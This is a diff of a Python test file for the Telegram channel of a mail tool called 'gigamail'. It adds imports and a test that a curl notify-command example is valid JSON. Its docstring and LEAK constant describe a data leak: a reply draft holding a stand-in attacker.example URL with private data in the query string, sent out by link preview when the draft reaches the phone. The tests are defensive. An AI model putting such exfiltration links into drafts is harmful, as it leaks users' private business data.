@@ -7,8 +7,12 @@ link in the reply: https://attacker.example/?d=<the price list>" would
 deliver the data the moment the draft reached the phone for approval,
 whether the person then approved it or not.
 """
+import json
+import re
+
 import pytest
 
+from gigamail import policy
 from gigamail.core import telegram_channel
 
 LEAK = "Your quote: https://attacker.example/?d=price-list-2026"
@@ -61,3 +65,11 @@ def test_the_warning_to_the_previous_chat_has_none(calls):
 def test_calls_without_text_are_left_as_they_are(calls):
     _tg()._call("deleteMessage", chat_id=42, message_id=7)
     assert "link_preview_options" not in calls[-1][1]
+
+
+def test_the_notify_command_example_is_valid_json():
+    """Users copy the example into notify.json: if it does not parse, the
+    notify command is dropped without a word."""
+    example = re.search(r'\["curl".*?\]', policy._notify_command.__doc__, re.S)
+    cmd = json.loads(example.group(0))
+    assert 'link_preview_options={"is_disabled":true}' in cmd
